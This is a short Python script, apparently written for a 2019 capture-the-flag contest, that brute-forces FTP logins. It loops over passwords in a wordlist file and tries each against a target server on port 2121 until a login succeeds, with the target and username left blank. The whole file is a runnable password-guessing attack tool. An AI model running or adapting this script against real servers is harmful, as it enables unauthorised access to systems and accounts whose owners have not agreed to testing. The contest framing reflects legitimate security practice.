# Writen for a CTF in 2019

from ftplib import FTP

server = FTP()

# Currently just manually set these
target = str()  
username = str()

with open('words.txt', 'r', newline='') as words:
    for word in words:
        try:
            print(word.strip())
            server.connect(target, 2121)
            server.login(username, word.strip())
            print("WORKED")
            break
        except:
            print("failed")
            print()
